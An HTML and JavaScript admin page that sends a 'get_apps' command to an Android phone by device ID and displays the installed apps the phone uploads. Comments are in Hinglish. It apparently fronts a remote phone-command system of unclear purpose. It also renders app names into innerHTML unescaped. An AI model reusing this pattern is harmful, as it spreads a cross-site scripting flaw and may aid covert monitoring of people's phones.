<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Installed Apps | Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #050505;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --text-main: #ffffff;
            --text-muted: #a0a0a0;
            --accent-color: #00d2ff;
            --danger-color: #ff4757;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }

        body {
            background-color: var(--bg-color);
            background-image: radial-gradient(circle at 10% 20%, rgba(0, 210, 255, 0.05) 0%, transparent 20%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 600px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        /* HEADER */
        .header {
            background: var(--glass-bg);
            backdrop-filter: blur(10px);
            border: 1px solid var(--glass-border);
            padding: 15px 20px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
        }

        .header-left { display: flex; align-items: center; gap: 15px; }
        .header h2 { font-size: 1.1rem; font-weight: 600; display: flex; align-items: center; gap: 10px; }
        .header h2 i { color: var(--accent-color); }
        
        .back-btn {
            text-decoration: none;
            color: var(--text-main);
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 12px;
            border-radius: 8px;
            transition: 0.3s;
        }
        .back-btn:hover { background: var(--accent-color); color: #000; }

        /* REFRESH BUTTON */
        .refresh-btn {
            background: rgba(0, 210, 255, 0.15);
            color: var(--accent-color);
            border: 1px solid rgba(0, 210, 255, 0.3);
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
        }
        .refresh-btn:hover { background: var(--accent-color); color: #000; }
        .refresh-btn:disabled { opacity: 0.6; cursor: not-allowed; filter: grayscale(1); }

        /* SEARCH */
        .search-container { position: relative; }
        .search-box {
            width: 100%;
            padding: 14px 15px 14px 45px;
            border-radius: 12px;
            border: 1px solid var(--glass-border);
            background: var(--glass-bg);
            color: white;
            font-size: 1rem;
            outline: none;
            transition: 0.3s;
        }
        .search-box:focus { border-color: var(--accent-color); box-shadow: 0 0 10px rgba(0, 210, 255, 0.2); }
        .search-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
        }

        /* APP LIST */
        .app-list { display: flex; flex-direction: column; gap: 10px; padding-bottom: 20px; }

        .app-card {
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            padding: 15px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            gap: 15px;
            transition: transform 0.2s, background 0.2s;
        }
        .app-card:hover {
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 255, 255, 0.2);
        }

        .icon-box {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            color: var(--accent-color);
        }

        .app-details { flex: 1; overflow: hidden; }
        .app-name { font-size: 1rem; font-weight: 600; color: white; margin-bottom: 3px; }
        .package-name { font-size: 0.75rem; color: var(--text-muted); font-family: monospace; }
        
        .status-badge {
            font-size: 0.7rem;
            padding: 4px 8px;
            border-radius: 6px;
            background: rgba(255, 255, 255, 0.1);
            color: var(--text-muted);
        }

        .loading, .empty-state { text-align: center; margin-top: 50px; color: var(--text-muted); }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="header-left">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
                <div>
                    <h2><i class="fa-brands fa-android"></i> Apps</h2>
                    <div id="device-id-display" style="font-size: 0.75rem; color: var(--text-muted);">ID: ...</div>
                </div>
            </div>
            <button id="refreshBtn" class="refresh-btn" onclick="requestUpdate()">
                <i class="fa-solid fa-sync"></i> Refresh
            </button>
        </div>

        <div class="search-container">
            <i class="fa-solid fa-search search-icon"></i>
            <input type="text" class="search-box" id="searchInput" placeholder="Search apps..." onkeyup="filterApps()">
        </div>

        <div id="app-list" class="app-list">
            <div class="loading">
                <i class="fa-solid fa-circle-notch fa-spin"></i> Loading...
            </div>
        </div>
    </div>

    <script>
        let currentDeviceId = null;

        document.addEventListener("DOMContentLoaded", () => {
            const urlParams = new URLSearchParams(window.location.search);
            // URL se ID uthana (Ex: installed_apps.html?id=12345)
            currentDeviceId = urlParams.get('deviceId') || urlParams.get('id');

            if (!currentDeviceId) {
                alert("❌ No Device Selected!");
                return;
            }

            document.getElementById("device-id-display").innerText = "ID: " + currentDeviceId;
            
            // Page load hote hi data fetch karo
            fetchApps(currentDeviceId);
        });

        // ✅ 1. COMMAND BHEJNE KA FUNCTION (Jo server se match karta hai)
        function requestUpdate() {
            if (!currentDeviceId) return;

            const btn = document.getElementById("refreshBtn");
            const icon = btn.querySelector("i");
            
            // Button disable karo taaki user baar baar click na kare
            btn.disabled = true;
            icon.classList.add("fa-spin");
            btn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Sending...`;

            // Server API call
            fetch('/api/send-command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    deviceId: currentDeviceId, 
                    command: 'get_apps'  // Yeh command phone par jayega
                })
            })
            .then(res => res.json())
            .then(data => {
                // Command chala gaya
                btn.innerHTML = `<i class="fa-solid fa-clock"></i> Waiting...`;
                
                // 5 Second wait karo (Phone ke upload karne ka time)
                setTimeout(() => {
                    fetchApps(currentDeviceId); // List reload karo
                    
                    // Button wapas normal karo
                    btn.disabled = false;
                    btn.innerHTML = `<i class="fa-solid fa-sync"></i> Refresh`;
                    icon.classList.remove("fa-spin");
                }, 5000); 
            })
            .catch(err => {
                console.error("Command Error:", err);
                alert("Command Failed! Server check karo.");
                btn.disabled = false;
                btn.innerHTML = `<i class="fa-solid fa-sync"></i> Retry`;
            });
        }

        // ✅ 2. DATA FETCH KARNE KA FUNCTION
        function fetchApps(deviceId) {
            const listContainer = document.getElementById("app-list");

            fetch(`/api/get-data/${deviceId}/installed_apps`)
                .then(res => res.json())
                .then(data => {
                    listContainer.innerHTML = ""; // Loader hatao

                    if (!data || data.length === 0) {
                        listContainer.innerHTML = `
                            <div class="empty-state">
                                <i class="fa-solid fa-box-open" style="font-size:3rem; opacity:0.5; margin-bottom:10px;"></i>
                                <p>No Apps Found.</p>
                                <small>Press Refresh to fetch list</small>
                            </div>`;
                        return;
                    }

                    data.forEach(app => {
                        // Data safely nikalna
                        const name = app.appName || app.app_name || app.name || "Unknown App";
                        const pkg = app.packageName || app.package_name || app.package || "com.unknown";
                        const ver = app.versionName || app.version || "";

                        const card = document.createElement("div");
                        card.className = "app-card";
                        card.innerHTML = `
                            <div class="icon-box"><i class="fa-brands fa-android"></i></div>
                            <div class="app-details">
                                <div class="app-name">${name}</div>
                                <div class="package-name">${pkg}</div>
                            </div>
                            ${ver ? `<div class="status-badge">v${ver}</div>` : ''}
                        `;
                        listContainer.appendChild(card);
                    });
                })
                .catch(err => {
                    console.error("Fetch Error:", err);
                    listContainer.innerHTML = `<div class="empty-state"><p>Error loading data</p></div>`;
                });
        }

        // ✅ 3. SEARCH FILTER
        function filterApps() {
            const input = document.getElementById('searchInput').value.toLowerCase();
            const cards = document.getElementsByClassName('app-card');

            for (let card of cards) {
                const name = card.querySelector('.app-name').innerText.toLowerCase();
                const pkg = card.querySelector('.package-name').innerText.toLowerCase();
                if (name.includes(input) || pkg.includes(input)) {
                    card.style.display = "flex";
                } else {
                    card.style.display = "none";
                }
            }
        }
    </script>

</body>
</html>
